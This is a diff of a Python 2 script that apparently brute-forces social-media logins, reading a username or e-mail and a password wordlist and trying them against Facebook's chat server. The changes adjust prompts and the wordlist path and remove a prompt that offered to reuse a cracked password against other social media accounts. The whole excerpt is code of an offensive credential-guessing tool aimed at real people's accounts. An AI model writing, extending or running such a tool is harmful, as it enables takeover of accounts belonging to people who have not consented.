@@ -37,16 +37,16 @@ def menu():
 def credential(tag):
         #Brute Force credencials
         if tag == 'bf':
-                username = raw_input('[+] - Insert username: ')
+                username = raw_input('[+] - Insert username or e-mail: ')
                 passfile = raw_input('[+] - Insert password file: ')
                 #Open wordlist file
-                file = open(passfile)
+                file = open('wordlist/'+passfile)
                 passwords = file.readlines()
                 file.close()
                 return username,passwords
         #Simple Login credencials
         elif tag == 'sl':
-                username = raw_input('[+] - Insert username: ')
+                username = raw_input('[+] - Insert username or e-mail: ')
                 password = getpass.getpass('[+] - Insert password: ')
                 if password == '' or username == '':
                         print '[+] - Empty password is not allowed'
@@ -86,10 +86,7 @@ def facebook_bf():
                         print '[+] - User: '+username
                         print '[+] - Password: '+password+endc
                         print
-                        proced = raw_input('[+] - Do you want to use the founded passowrd to perform a brute force in other Social Media?')
-                        decision(proced)
-                        #break
-
+                        
 def facebook_sl():
         tag = 'sl'
         server = 'chat.facebook.com'
